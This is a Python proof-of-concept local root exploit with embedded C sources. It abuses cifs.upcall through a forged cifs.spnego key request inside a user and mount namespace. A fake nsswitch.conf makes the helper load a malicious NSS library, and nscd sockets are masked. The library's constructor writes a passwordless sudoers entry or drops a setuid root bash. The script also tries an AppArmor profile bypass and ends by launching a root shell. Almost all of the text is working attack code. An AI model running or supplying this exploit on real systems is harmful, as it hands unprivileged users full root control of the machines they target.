#!/usr/bin/env python3
import json
import os
import pwd
import re
import shlex
import shutil
import stat
import subprocess
import sys
import textwrap
import time
from pathlib import Path


RUN_TOKEN = "%s_%s" % (os.getuid(), os.getpid())
WORKDIR = Path("/tmp") / ("cifs-upcall-sudoers-poc-%s" % RUN_TOKEN)
FAKELIB_DIR = WORKDIR / "fakelib"
FAKE_NSSWITCH = WORKDIR / "nsswitch.conf"
EVIDENCE_LOG = Path("/tmp/cifs_upcall_sudoers_evidence_%s.txt" % RUN_TOKEN)
ROOT_SHELL = Path("/var/tmp/cifs_upcall_rootsh_%s" % RUN_TOKEN)
UNSHARE_COMMAND = ["unshare", "-Ur", "-m"]


LIBNSS_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define EVIDENCE_PATH @@EVIDENCE_PATH@@
#define SUDOERS_PATH @@SUDOERS_PATH@@
#define SUDOERS_USER @@SUDOERS_USER@@
#define ROOT_SHELL_PATH @@ROOT_SHELL_PATH@@

static void write_all(int fd, const char *buf, size_t len)
{
        while (len) {
                ssize_t ret = write(fd, buf, len);
                if (ret <= 0)
                        return;
                buf += ret;
                len -= (size_t)ret;
        }
}

static void create_fallback_root_shell(int logfd)
{
        int in_fd;
        int out_fd;
        int rc;
        int saved_errno;
        char buf[8192];
        ssize_t n;

        errno = 0;
        in_fd = open("/bin/bash", O_RDONLY | O_CLOEXEC);
        saved_errno = errno;
        if (in_fd < 0) {
                if (logfd >= 0)
                        dprintf(logfd, "fallback failed to open /bin/bash errno=%d (%s)\n",
                                saved_errno, strerror(saved_errno));
                return;
        }

        errno = 0;
        out_fd = open(ROOT_SHELL_PATH,
                      O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
        saved_errno = errno;
        if (out_fd < 0) {
                if (logfd >= 0)
                        dprintf(logfd, "fallback failed to open %s errno=%d (%s)\n",
                                ROOT_SHELL_PATH, saved_errno,
                                strerror(saved_errno));
                close(in_fd);
                return;
        }

        while ((n = read(in_fd, buf, sizeof(buf))) > 0)
                write_all(out_fd, buf, (size_t)n);

        errno = 0;
        rc = fchown(out_fd, 0, 0);
        saved_errno = errno;
        if (logfd >= 0)
                dprintf(logfd, "fallback fchown root shell rc=%d errno=%d (%s)\n",
                        rc, saved_errno, strerror(saved_errno));

        errno = 0;
        rc = fchmod(out_fd, 04755);
        saved_errno = errno;
        if (logfd >= 0)
                dprintf(logfd, "fallback fchmod root shell rc=%d errno=%d (%s)\n",
                        rc, saved_errno, strerror(saved_errno));

        fsync(out_fd);
        close(out_fd);
        close(in_fd);

        if (logfd >= 0)
                dprintf(logfd, "created fallback root shell: %s\n",
                        ROOT_SHELL_PATH);
}

__attribute__((constructor))
static void pwn_constructor(void)
{
        int logfd;
        int sudoers_fd;
        int rc;
        int saved_errno;
        const char *comment =
                "# cifs.upcall namespace NSS PoC; remove after testing\n";

        logfd = open(EVIDENCE_PATH,
                     O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
        if (logfd >= 0)
                dprintf(logfd, "attacker NSS loaded by cifs.upcall\n");

        rc = mkdir("/etc/sudoers.d", 0755);
        if (rc != 0 && errno != EEXIST && logfd >= 0)
                dprintf(logfd, "warning: mkdir /etc/sudoers.d failed errno=%d (%s)\n",
                        errno, strerror(errno));

        errno = 0;
        sudoers_fd = open(SUDOERS_PATH,
                          O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
        saved_errno = errno;
        if (sudoers_fd < 0) {
                if (logfd >= 0)
                        dprintf(logfd, "failed to open %s errno=%d (%s)\n",
                                SUDOERS_PATH, saved_errno,
                                strerror(saved_errno));

                create_fallback_root_shell(logfd);

                if (logfd >= 0)
                        close(logfd);
                return;
        }

        write_all(sudoers_fd, comment, strlen(comment));
        dprintf(sudoers_fd, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n",
                SUDOERS_USER);
        fchmod(sudoers_fd, 0440);
        fsync(sudoers_fd);
        close(sudoers_fd);

        if (logfd >= 0) {
                dprintf(logfd, "wrote sudoers entry: %s\n", SUDOERS_PATH);
                close(logfd);
        }
}

enum nss_status _nss_pwn_getpwuid_r(uid_t uid, struct passwd *pwd,
                                    char *buffer, size_t buflen, int *errnop)
{
        const char *name = "root";
        const char *gecos = "root";
        const char *dir = "/root";
        const char *shell = "/bin/bash";
        size_t need = strlen(name) + strlen(gecos) + strlen(dir) +
                      strlen(shell) + 4;
        char *p = buffer;

        if (buflen < need) {
                *errnop = ERANGE;
                return NSS_STATUS_TRYAGAIN;
        }

        strcpy(p, name);
        pwd->pw_name = p;
        p += strlen(p) + 1;
        strcpy(p, gecos);
        pwd->pw_gecos = p;
        p += strlen(p) + 1;
        strcpy(p, dir);
        pwd->pw_dir = p;
        p += strlen(p) + 1;
        strcpy(p, shell);
        pwd->pw_shell = p;

        pwd->pw_passwd = (char *)"x";
        pwd->pw_uid = uid;
        pwd->pw_gid = 0;
        *errnop = 0;
        return NSS_STATUS_SUCCESS;
}
'''


TRIGGER_SOURCE = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef __NR_request_key
# if defined(__x86_64__)
#  define __NR_request_key 249
# else
#  error "unknown request_key syscall number"
# endif
#endif

#ifndef __NR_keyctl
# if defined(__x86_64__)
#  define __NR_keyctl 250
# else
#  error "unknown keyctl syscall number"
# endif
#endif

#ifndef KEY_SPEC_SESSION_KEYRING
# define KEY_SPEC_SESSION_KEYRING -3
#endif

#ifndef KEYCTL_JOIN_SESSION_KEYRING
# define KEYCTL_JOIN_SESSION_KEYRING 1
#endif

static void die(const char *what)
{
        perror(what);
        exit(1);
}

static long do_request_key(const char *desc)
{
        return syscall(__NR_request_key, "cifs.spnego", desc, "",
                       KEY_SPEC_SESSION_KEYRING);
}

static void ensure_live_session_keyring(void)
{
        long ret;

        errno = 0;
        ret = syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING,
                      "cifs-upcall-sudoers-poc", 0, 0, 0);
        if (ret < 0)
                die("KEYCTL_JOIN_SESSION_KEYRING");
}

static void try_autoload_cifs(void)
{
        char mountpoint[] = "/tmp/cifs_upcall_sudoers_autoload_XXXXXX";
        char *dir;
        pid_t pid;
        int status;

        dir = mkdtemp(mountpoint);
        if (!dir)
                return;
        chmod(dir, 0755);

        pid = fork();
        if (pid == 0) {
                int devnull = open("/dev/null", O_WRONLY | O_CLOEXEC);
                if (devnull >= 0) {
                        dup2(devnull, STDOUT_FILENO);
                        dup2(devnull, STDERR_FILENO);
                }
                execlp("mount", "mount", "-t", "cifs",
                       "//127.0.0.1/share", dir, "-o", "guest,vers=3.0",
                       (char *)NULL);
                _exit(127);
        }
        if (pid > 0)
                (void)waitpid(pid, &status, 0);

        rmdir(dir);
}

static void mask_dir_if_present(const char *path)
{
        struct stat st;

        if (stat(path, &st) != 0 || !S_ISDIR(st.st_mode))
                return;

        if (mount("tmpfs", path, "tmpfs", 0, "mode=755") != 0)
                fprintf(stderr, "warning: failed to mask %s: %s\n",
                        path, strerror(errno));
}

static void mask_runtime_nss_caches(void)
{
        /*
         * SLES commonly has nscd active for passwd/group. Hide its socket in
         * this private mount namespace so getpwuid(0) must consult the
         * namespace-local nsswitch.conf and load libnss_pwn.so.2.
         */
        mask_dir_if_present("/run/nscd");
        mask_dir_if_present("/var/run/nscd");
}

static void bind_nsswitch_config(const char *source)
{
        const char *targets[] = {
                "/etc/nsswitch.conf",
                "/usr/etc/nsswitch.conf",
                NULL
        };
        int saved_errno = ENOENT;

        for (int i = 0; targets[i]; i++) {
                struct stat st;

                errno = 0;
                if (stat(targets[i], &st) != 0) {
                        if (errno != ENOENT)
                                saved_errno = errno;
                        continue;
                }

                errno = 0;
                if (mount(source, targets[i], NULL, MS_BIND, NULL) == 0) {
                        fprintf(stderr, "using nsswitch bind target: %s\n",
                                targets[i]);
                        return;
                }

                saved_errno = errno;
        }

        errno = saved_errno;
        die("bind nsswitch.conf");
}

int main(int argc, char **argv)
{
        char desc[768];
        long ret;

        if (argc < 4) {
                fprintf(stderr, "usage: %s /path/to/fakelibdir /path/to/nsswitch.conf /nss/libdir [...]\n", argv[0]);
                return 2;
        }

        ensure_live_session_keyring();

        if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0)
                die("make mounts private");
        try_autoload_cifs();
        mask_runtime_nss_caches();
        bind_nsswitch_config(argv[2]);

        for (int i = 3; i < argc; i++) {
                if (mount(argv[1], argv[i], NULL, MS_BIND | MS_REC, NULL) != 0)
                        die("bind nss libdir");
        }

        snprintf(desc, sizeof(desc),
                 "ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;"
                 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                 getpid());
        errno = 0;
        ret = do_request_key(desc);
        fprintf(stderr, "sent forged cifs.spnego upcall (request_key rc=%ld errno=%d)\n",
                ret, errno);
        sleep(2);
        return 0;
}
'''


def shell_join(command):
    return " ".join(shlex.quote(str(arg)) for arg in command)


def step(message):
    print("\n***%s***" % message, flush=True)


def run(command, check=True, cwd=None):
    print("$ " + shell_join(command), flush=True)
    completed = subprocess.run(
        [str(arg) for arg in command],
        cwd=str(cwd) if cwd else None,
        universal_newlines=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    if completed.stdout:
        print(completed.stdout, end="", flush=True)
    if check and completed.returncode != 0:
        raise SystemExit("command failed with exit %s: %s" % (completed.returncode, shell_join(command)))
    return completed


def run_quiet(command, cwd=None):
    return subprocess.run(
        [str(arg) for arg in command],
        cwd=str(cwd) if cwd else None,
        universal_newlines=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )


def write_text(path, content):
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")


def c_string_literal(value):
    return json.dumps(str(value))


def detect_invoking_user():
    if os.getuid() == 0:
        raise SystemExit("run this PoC as the unprivileged user to be granted sudo")
    username = pwd.getpwuid(os.getuid()).pw_name
    if not re.match(r"^[A-Za-z0-9_.-]+[$]?$", username):
        raise SystemExit("refusing unusual sudoers username syntax: %r" % username)
    return username


def detect_nss_lib_dirs():
    candidates = [
        Path("/usr/lib64"),
        Path("/lib64"),
        Path("/lib/x86_64-linux-gnu"),
        Path("/usr/lib/x86_64-linux-gnu"),
    ]
    found = []
    seen = set()
    for candidate in candidates:
        if not (candidate / "libnss_files.so.2").exists():
            continue
        resolved = candidate.resolve()
        key = str(resolved)
        if key in seen:
            continue
        seen.add(key)
        found.append(resolved)
    if not found:
        raise SystemExit("could not locate an NSS module directory containing libnss_files.so.2")
    return found


def check_nsswitch_targets_exist():
    targets = [
        Path("/etc/nsswitch.conf"),
        Path("/usr/etc/nsswitch.conf"),
    ]
    found = [path for path in targets if path.exists()]
    if not found:
        raise SystemExit(
            "preflight failed: no nsswitch.conf bind target found; expected /etc/nsswitch.conf or /usr/etc/nsswitch.conf"
        )


def check_required_commands():
    missing = []
    for command in ["bash", "gcc", "mount", "sudo", "unshare"]:
        if shutil.which(command) is None:
            missing.append(command)
    if missing:
        raise SystemExit("preflight failed: missing required command(s): %s" % ", ".join(missing))


def select_user_namespace_command():
    completed = run_quiet(UNSHARE_COMMAND + ["true"])
    if completed.returncode == 0:
        return list(UNSHARE_COMMAND)

    direct_error = completed.stdout.strip()
    aa_exec = shutil.which("aa-exec")
    if aa_exec is None:
        raise SystemExit(
            "preflight failed: unprivileged user+mount namespaces are unavailable, "
            "and aa-exec is not installed for the trinity profile fallback:\n%s" %
            direct_error
        )

    # Ubuntu AppArmor userns policy may block direct unshare while allowing it
    # under an existing profile such as trinity.
    fallback = ["aa-exec", "-p", "trinity", "--"] + UNSHARE_COMMAND
    fallback_completed = run_quiet(fallback + ["true"])
    if fallback_completed.returncode == 0:
        print("using aa-exec trinity profile for user namespace setup", flush=True)
        return fallback

    raise SystemExit(
        "preflight failed: unprivileged user+mount namespaces are unavailable. "
        "The aa-exec trinity fallback was also unavailable or denied.\n"
        "direct unshare output:\n%s\n"
        "aa-exec trinity output:\n%s" %
        (direct_error, fallback_completed.stdout.strip())
    )


def check_request_key_rule():
    paths = [Path("/etc/request-key.conf"), Path("/etc/request-key.d")]
    active = []
    for path in paths:
        files = [path]
        if path.is_dir():
            files = sorted(child for child in path.iterdir() if child.is_file())
        for filename in files:
            try:
                lines = filename.read_text(encoding="utf-8", errors="replace").splitlines()
            except (IOError, OSError):
                continue
            for line in lines:
                stripped = line.strip()
                if not stripped or stripped.startswith("#"):
                    continue
                if "cifs.spnego" in stripped:
                    active.append("%s: %s" % (filename, stripped))

    if not active:
        raise SystemExit(
            "preflight failed: no active cifs.spnego request-key rule found in /etc/request-key.conf or /etc/request-key.d"
        )

    for line in active:
        if "cifs.upcall" in line:
            return

    raise SystemExit(
        "preflight failed: cifs.spnego exists but does not call cifs.upcall; active rule(s):\n  %s" %
        "\n  ".join(active)
    )


def cifs_kernel_registered() -> bool:
    try:
        filesystems = Path("/proc/filesystems").read_text(encoding="utf-8", errors="replace")
    except (IOError, OSError):
        return False

    for line in filesystems.splitlines():
        fields = line.split()
        if fields and fields[-1] == "cifs":
            return True
    return False


def check_workdir_executable():
    probe = WORKDIR / "exec-probe.sh"
    write_text(probe, "#!/bin/sh\nexit 0\n")
    probe.chmod(0o700)
    try:
        completed = run_quiet([str(probe)])
    except OSError as exc:
        raise SystemExit(
            "preflight failed: cannot execute files from %s (%s). /tmp may be mounted noexec." %
            (WORKDIR, exc)
        )
    if completed.returncode != 0:
        raise SystemExit(
            "preflight failed: execute probe in %s returned %s:\n%s" %
            (WORKDIR, completed.returncode, completed.stdout.strip())
        )


def render_libnss_source(sudoers_user, sudoers_path):
    return (
        LIBNSS_SOURCE
        .replace("@@EVIDENCE_PATH@@", c_string_literal(EVIDENCE_LOG))
        .replace("@@SUDOERS_PATH@@", c_string_literal(sudoers_path))
        .replace("@@SUDOERS_USER@@", c_string_literal(sudoers_user))
        .replace("@@ROOT_SHELL_PATH@@", c_string_literal(ROOT_SHELL))
    )


def sudo_root_check():
    completed = subprocess.run(
        ["sudo", "-n", "/bin/bash", "-p", "-c", "id -u"],
        universal_newlines=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    return completed.returncode == 0 and completed.stdout.strip() == "0"


def read_evidence():
    if not EVIDENCE_LOG.exists():
        return ""
    return EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")


def check_fallback_root_shell():
    try:
        st = ROOT_SHELL.stat()
    except FileNotFoundError:
        raise SystemExit(
            "fallback failed: direct sudoers write failed, but no fallback root shell was created at %s" %
            ROOT_SHELL
        )
    if st.st_uid != 0 or not (st.st_mode & stat.S_ISUID):
        raise SystemExit(
            "fallback failed: %s exists, but is not a root-owned setuid shell (uid=%s mode=%o)" %
            (ROOT_SHELL, st.st_uid, stat.S_IMODE(st.st_mode))
        )


def write_sudoers_via_fallback_shell(sudoers_user, sudoers_path):
    check_fallback_root_shell()
    sudoers_command = (
        "printf '%%s\\n' '# cifs.upcall namespace NSS PoC; remove after testing' "
        "%s > %s; "
        "chown root:root %s; "
        "chmod 0440 %s; "
        "stat -c 'fallback sudoers state: %%n: %%A uid=%%u gid=%%g size=%%s' %s"
    ) % (
        shlex.quote("%s ALL=(ALL:ALL) NOPASSWD: ALL" % sudoers_user),
        shlex.quote(str(sudoers_path)),
        shlex.quote(str(sudoers_path)),
        shlex.quote(str(sudoers_path)),
        shlex.quote(str(sudoers_path)),
    )
    run([str(ROOT_SHELL), "-p", "-c", sudoers_command], check=True)


def main() -> None:
    check_required_commands()
    sudoers_user = detect_invoking_user()
    sudoers_path = Path("/etc/sudoers.d/cifs-upcall-poc-%s" % RUN_TOKEN)
    nss_lib_dirs = detect_nss_lib_dirs()
    check_nsswitch_targets_exist()

    step("PREFLIGHT")
    print("running as uid=%s gid=%s user=%s" % (os.getuid(), os.getgid(), sudoers_user), flush=True)
    if sudo_root_check():
        raise SystemExit("preflight failed: this user already has passwordless sudo/root; use a less-privileged test account")
    userns_command = select_user_namespace_command()
    check_request_key_rule()

    step("BUILDING POC")
    print("workdir: %s" % WORKDIR, flush=True)
    print("sudoers target: %s" % sudoers_path, flush=True)
    print("nss library mount targets: " + " ".join(str(path) for path in nss_lib_dirs), flush=True)
    shutil.rmtree(str(WORKDIR), ignore_errors=True)
    FAKELIB_DIR.mkdir(parents=True)
    check_workdir_executable()
    write_text(WORKDIR / "libnss_pwn.c", render_libnss_source(sudoers_user, sudoers_path))
    write_text(WORKDIR / "trigger.c", TRIGGER_SOURCE)
    write_text(
        FAKE_NSSWITCH,
        """
        passwd: pwn files
        group: files
        shadow: files
        hosts: files dns
        """,
    )
    run(["gcc", "-Wall", "-Wextra", "-shared", "-fPIC", "-o", "fakelib/libnss_pwn.so.2", "libnss_pwn.c"], cwd=WORKDIR)
    run(["gcc", "-Wall", "-Wextra", "-o", "trigger", "trigger.c"], cwd=WORKDIR)

    step("TRIGGERING CIFS UPCALL")
    run(
        userns_command + ["./trigger", str(FAKELIB_DIR), str(FAKE_NSSWITCH)] +
        [str(path) for path in nss_lib_dirs],
        cwd=WORKDIR,
        check=True,
    )
    time.sleep(1)

    evidence = read_evidence()
    if not evidence:
        if not cifs_kernel_registered():
            raise SystemExit(
                "exploit failed: the CIFS kernel filesystem is not registered. "
                "cifs-utils installs user-space helpers, but cifs.ko must be loaded "
                "before the cifs.spnego key type can dispatch to cifs.upcall. "
                "If grep -w cifs /proc/filesystems stays empty after an attempted "
                "CIFS mount, kernel/module policy is blocking this PoC path."
            )
        raise SystemExit(
            "exploit failed: cifs.upcall did not load the attacker NSS module. "
            "The cifs.spnego request-key rule may be disabled/negated, an LSM policy may "
            "have blocked the helper, or the kernel may already reject userspace-created "
            "cifs.spnego descriptions."
        )
    print(evidence, end="", flush=True)
    if "wrote sudoers entry:" not in evidence:
        if "created fallback root shell:" not in evidence:
            raise SystemExit("exploit failed: attacker NSS loaded, but neither sudoers nor the fallback root shell was written")
        step("DIRECT SUDOERS WRITE FAILED; USING FALLBACK ROOT SHELL")
        write_sudoers_via_fallback_shell(sudoers_user, sudoers_path)

    step("SPAWNING ROOT SHELL")
    if not sudo_root_check():
        raise SystemExit("exploit failed: sudoers entry was written, but sudo -n root check still failed")

    print("root shell will be launched by this original process in the host namespace.", flush=True)
    print("cleanup after testing:", flush=True)
    print("  sudo rm -f %s %s %s" % (
        shlex.quote(str(sudoers_path)),
        shlex.quote(str(EVIDENCE_LOG)),
        shlex.quote(str(ROOT_SHELL)),
    ), flush=True)
    print("  rm -rf %s" % shlex.quote(str(WORKDIR)), flush=True)

    print("$ sudo -n /bin/bash -p", flush=True)
    os.execvp("sudo", ["sudo", "-n", "/bin/bash", "-p"])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
